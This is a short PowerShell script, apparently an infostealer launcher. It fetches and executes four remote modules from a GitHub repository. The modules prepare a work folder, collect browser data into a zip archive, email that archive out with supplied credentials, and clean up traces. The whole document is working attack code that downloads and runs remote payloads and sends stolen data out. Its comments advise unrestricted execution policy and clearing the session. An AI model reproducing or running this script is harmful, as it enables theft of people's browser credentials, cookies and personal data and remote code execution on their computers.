param (
    [Parameter()]
    [String]$Username,
    [String]$Password
)

# Admin powershell
# Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
# Remove-Variable * -ErrorAction SilentlyContinue; Remove-Module *; $error.Clear(); Clear-Host

Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/prepare_work_folder.ps1) }"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_browsers_data.ps1) } browserdata.zip"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $Username $Password $env:appdata\Microsoft\dump\browserdata.zip"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/cleanup.ps1) }"